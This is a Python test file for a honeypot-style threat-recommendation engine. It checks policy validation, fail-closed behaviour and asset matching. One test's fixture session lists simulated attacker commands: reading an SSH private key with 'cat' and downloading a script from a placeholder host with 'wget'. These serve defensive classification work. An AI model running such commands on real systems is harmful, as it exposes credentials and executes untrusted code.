from __future__ import annotations

import copy
import json
from pathlib import Path

from production.api.monitor_web import _report_recommendations
from production.policies.validate_smb_policy import validate_action_policy
from production.reporting.artifacts import build_stix_bundle
from production.reporting.reporting_pipeline import _build_trusted_recommendation_decision
from production.reporting.smb_decision import (
    build_smb_decision,
    build_smb_decision_from_paths,
    load_action_policy,
)
from production.reporting.threat_hypothesis import build_v2_report


ROOT = Path(__file__).resolve().parents[1]
POLICY_PATH = ROOT / "configs/smb_action_playbooks.trusted.json"
ASSET_PATH = ROOT / "configs/smb_asset_profile.example.json"


def _policy() -> dict:
    return json.loads(POLICY_PATH.read_text(encoding="utf-8"))


def _asset_profile() -> dict:
    return json.loads(ASSET_PATH.read_text(encoding="utf-8"))


def _discovery_session(**overrides: object) -> dict:
    payload = {
        "session_id": "recommendation-policy-test",
        "src_ip": "192.0.2.25",
        "protocol": "ssh",
        "dst_port": 22,
        "commands": ["whoami"],
        "classification_events": [
            {
                "command": "whoami",
                "ttp": "T1033",
                "tactic": "discovery",
                "source": "rule",
                "confidence": 1.0,
                "evidence_id": "recommendation-policy-evidence",
            }
        ],
    }
    payload.update(overrides)
    return payload


def test_trusted_policy_is_validated_before_runtime_use() -> None:
    loaded = load_action_policy(str(POLICY_PATH))
    decision = build_smb_decision(
        _discovery_session(),
        asset_profile=_asset_profile(),
        action_policy=loaded,
    )

    assert loaded["policy_status"] == "valid"
    assert loaded["validation_errors"] == []
    assert decision["status"] == "available"
    assert decision["authority"] == "trusted_policy_engine"
    assert decision["trust"]["policy_validation"] == {
        "status": "valid",
        "errors": [],
    }
    assert all(
        item["recommendation_tier"] == "trusted_recommendation"
        for item in decision["immediate_actions"]
    )


def test_unreviewed_policy_fails_closed_without_strong_actions() -> None:
    policy = _policy()
    policy["risk_rules"][0]["provenance"]["reviewed"] = False

    decision = build_smb_decision(
        _discovery_session(),
        asset_profile=_asset_profile(),
        action_policy=policy,
    )

    assert decision["status"] == "unavailable"
    assert decision["authority"] == "policy_unavailable"
    assert decision["immediate_actions"] == []
    assert decision["default_guidance"] == []
    assert decision["matched_risk_rules"] == []
    assert decision["matched_goal_rules"] == []
    assert any(
        "provenance.reviewed must be true" in error
        for error in decision["trust"]["policy_validation"]["errors"]
    )
    assert decision["recommendation_tiers"]["audit_only_candidates"]


def test_duplicate_action_ids_are_validation_errors_not_runtime_merges() -> None:
    policy = _policy()
    first = policy["action_playbooks"][0]["actions"][0]
    second = policy["action_playbooks"][0]["actions"][1]
    second["action_id"] = first["action_id"]
    second["action"] = "A deliberately conflicting action body."

    errors = validate_action_policy(policy)
    decision = build_smb_decision(
        _discovery_session(),
        asset_profile=_asset_profile(),
        action_policy=policy,
    )

    assert any("duplicate action_id" in error for error in errors)
    assert decision["immediate_actions"] == []
    assert decision["default_guidance"] == []
    assert decision["trust"]["policy_validation"]["status"] == "invalid"


def test_unknown_and_contradictory_conditions_are_rejected() -> None:
    unknown = _policy()
    unknown["risk_rules"][0]["applies_when"]["asset_category_typo"] = ["remote_access"]
    contradictory = _policy()
    contradictory["action_playbooks"][0]["applies_when"].update(
        {
            "required_flags": ["has_commands"],
            "absent_flags": ["has_commands"],
            "min_command_count": 5,
            "max_command_count": 1,
        }
    )
    unknown_flag = _policy()
    unknown_flag["action_playbooks"][0]["applies_when"]["absent_flags"] = [
        "unregistered_flag"
    ]
    invalid_regex = _policy()
    invalid_regex["action_playbooks"][0]["applies_when"]["any_command_regex"] = ["["]
    downgraded_rule = _policy()
    downgraded_rule["risk_rules"][0]["source_type"] = "policy_default"
    downgraded_rule["risk_rules"][0].pop("provenance")

    unknown_errors = validate_action_policy(unknown)
    contradictory_errors = validate_action_policy(contradictory)
    unknown_flag_errors = validate_action_policy(unknown_flag)
    invalid_regex_errors = validate_action_policy(invalid_regex)
    downgraded_errors = validate_action_policy(downgraded_rule)
    contradictory_decision = build_smb_decision(
        _discovery_session(),
        asset_profile=_asset_profile(),
        action_policy=contradictory,
    )

    assert any("unsupported applies_when field" in error for error in unknown_errors)
    assert any("both required and absent" in error for error in contradictory_errors)
    assert any("min_command_count exceeds max_command_count" in error for error in contradictory_errors)
    assert any("unsupported behavior flag" in error for error in unknown_flag_errors)
    assert any("invalid pattern" in error for error in invalid_regex_errors)
    assert any("reserved for default guidance" in error for error in downgraded_errors)
    assert any("provenance is required" in error for error in downgraded_errors)
    assert contradictory_decision["status"] == "unavailable"
    assert contradictory_decision["immediate_actions"] == []
    assert contradictory_decision["default_guidance"] == []


def test_missing_session_asset_fields_cannot_match_scoped_asset() -> None:
    policy = _policy()
    scoped = next(
        item
        for item in policy["action_playbooks"]
        if item["rule_id"] == "remote-access-baseline-response"
    )
    policy["risk_rules"] = []
    policy["goal_rules"] = []
    policy["action_playbooks"] = [scoped]
    asset_profile = {
        "schema_version": "smb_asset_profile.v1",
        "assets": [
            {
                "asset_id": "scoped-ssh",
                "display_name": "Scoped SSH service",
                "service_category": "remote_access",
                "criticality": "high",
                "protocols": ["ssh"],
                "ports": [22],
                "internet_exposed": True,
            }
        ],
    }

    missing_context = build_smb_decision(
        _discovery_session(protocol="", dst_port=""),
        asset_profile=asset_profile,
        action_policy=policy,
    )
    complete_context = build_smb_decision(
        _discovery_session(),
        asset_profile=asset_profile,
        action_policy=policy,
    )

    assert missing_context["asset_context"]["matched_assets"] == []
    assert missing_context["immediate_actions"] == []
    assert missing_context["default_guidance"]
    assert complete_context["asset_context"]["matched_assets"][0]["asset_id"] == "scoped-ssh"
    assert complete_context["immediate_actions"]


def test_non_internet_asset_condition_is_enforced_both_ways() -> None:
    policy = _policy()
    scoped = next(
        copy.deepcopy(item)
        for item in policy["action_playbooks"]
        if item["rule_id"] == "remote-access-baseline-response"
    )
    scoped["applies_when"]["internet_exposed_asset"] = False
    policy["risk_rules"] = []
    policy["goal_rules"] = []
    policy["action_playbooks"] = [scoped]
    private_profile = {
        "schema_version": "smb_asset_profile.v1",
        "assets": [
            {
                "asset_id": "private-ssh",
                "display_name": "Private SSH service",
                "service_category": "remote_access",
                "criticality": "high",
                "protocols": ["ssh"],
                "ports": [22],
                "internet_exposed": False,
            }
        ],
    }
    public_profile = copy.deepcopy(private_profile)
    public_profile["assets"][0]["internet_exposed"] = True

    private = build_smb_decision(
        _discovery_session(),
        asset_profile=private_profile,
        action_policy=policy,
    )
    public = build_smb_decision(
        _discovery_session(),
        asset_profile=public_profile,
        action_policy=policy,
    )

    assert private["immediate_actions"]
    assert public["immediate_actions"] == []
    assert public["default_guidance"]


def test_recommendation_order_is_independent_of_policy_list_order() -> None:
    policy = _policy()
    reversed_policy = copy.deepcopy(policy)
    for group in ("risk_rules", "goal_rules", "action_playbooks"):
        reversed_policy[group].reverse()
    for playbook in reversed_policy["action_playbooks"]:
        playbook["actions"].reverse()
    session = {
        **_discovery_session(login_success=True),
        "commands": [
            "whoami",
            "cat /home/example/.ssh/id_rsa",
            "wget https://example.invalid/a.sh -O /tmp/a.sh",
        ],
        "classification_events": [
            {
                "command": "cat /home/example/.ssh/id_rsa",
                "ttp": "T1552",
                "tactic": "credential-access",
                "source": "rule",
                "confidence": 1.0,
                "evidence_id": "credential-evidence",
            },
            {
                "command": "wget https://example.invalid/a.sh -O /tmp/a.sh",
                "ttp": "T1105",
                "tactic": "command-and-control",
                "source": "rule",
                "confidence": 1.0,
                "evidence_id": "transfer-evidence",
            },
        ],
    }

    first = build_smb_decision(session, asset_profile=_asset_profile(), action_policy=policy)
    second = build_smb_decision(
        session,
        asset_profile=_asset_profile(),
        action_policy=reversed_policy,
    )

    assert [item["action_id"] for item in first["immediate_actions"]] == [
        item["action_id"] for item in second["immediate_actions"]
    ]
    assert [item["rule_id"] for item in first["matched_risk_rules"]] == [
        item["rule_id"] for item in second["matched_risk_rules"]
    ]
    assert [item["rule_id"] for item in first["matched_goal_rules"]] == [
        item["rule_id"] for item in second["matched_goal_rules"]
    ]
    assert first["risk"]["rule_id"] == second["risk"]["rule_id"]
    assert first["likely_goal"]["rule_id"] == second["likely_goal"]["rule_id"]


def test_default_guidance_is_separate_and_not_promoted_as_operator_action() -> None:
    policy = _policy()
    policy["action_playbooks"] = []
    decision = build_smb_decision(
        {"session_id": "low-evidence"},
        asset_profile=_asset_profile(),
        action_policy=policy,
    )

    assert decision["immediate_actions"] == []
    assert decision["default_guidance"]
    assert decision["recommendation_tiers"]["trusted_recommendations"] == []
    assert decision["recommendation_tiers"]["default_guidance"] == decision["default_guidance"]
    assert all(
        item["authority"] == "policy_default_guidance"
        and item["recommendation_tier"] == "default_guidance"
        for item in decision["default_guidance"]
    )

    report = build_v2_report(
        {
            "recommended_actions_structured": decision["default_guidance"],
            "recommendation_provenance": {"authority": "trusted_policy_engine"},
        },
        [{"session_id": "low-evidence", "commands": []}],
    )
    monitor = _report_recommendations(report, {}, {})

    assert report["recommendations"]["operator_actions"] == []
    assert monitor["recommended_actions_structured"] == []


def test_unreviewed_serialized_action_is_rejected_by_every_consumer() -> None:
    decision = build_smb_decision(
        _discovery_session(),
        asset_profile=_asset_profile(),
        action_policy=_policy(),
    )
    action = copy.deepcopy(decision["immediate_actions"][0])
    action["provenance"]["rule"]["reviewed"] = False
    legacy_report = {
        "session_id": "unreviewed-serialized-action",
        "recommended_actions_structured": [action],
        "recommendation_provenance": {
            "authority": "trusted_policy_engine",
            "status": "available",
            "policy": decision["trust"]["policy"],
        },
    }

    report = build_v2_report(legacy_report, [_discovery_session()])
    monitor = _report_recommendations(legacy_report, {}, {})
    stix = build_stix_bundle(legacy_report, _discovery_session())

    assert report["recommendations"]["operator_actions"] == []
    assert monitor["recommended_actions_structured"] == []
    assert not any(item.get("type") == "course-of-action" for item in stix["objects"])


def test_missing_or_invalid_policy_file_is_failure_safe(tmp_path: Path) -> None:
    missing = tmp_path / "missing-policy.json"
    malformed = tmp_path / "malformed-policy.json"
    malformed.write_text("{not-json", encoding="utf-8")

    for path in (missing, malformed):
        loaded = load_action_policy(str(path))
        decision = build_smb_decision_from_paths(
            _discovery_session(),
            asset_profile_path=str(ASSET_PATH),
            action_policy_path=str(path),
        )
        assert loaded["policy_status"] in {"invalid", "unavailable"}
        assert loaded["validation_errors"]
        assert decision["status"] == "unavailable"
        assert decision["authority"] == "policy_unavailable"
        assert decision["immediate_actions"] == []
        assert decision["default_guidance"] == []

    report_decision = _build_trusted_recommendation_decision(
        [],
        [],
        {},
        {},
        asset_profile_path=str(ASSET_PATH),
        action_policy_path=str(missing),
    )
    assert report_decision["status"] == "unavailable"
    assert report_decision["authority"] == "policy_unavailable"
    assert report_decision["immediate_actions"] == []
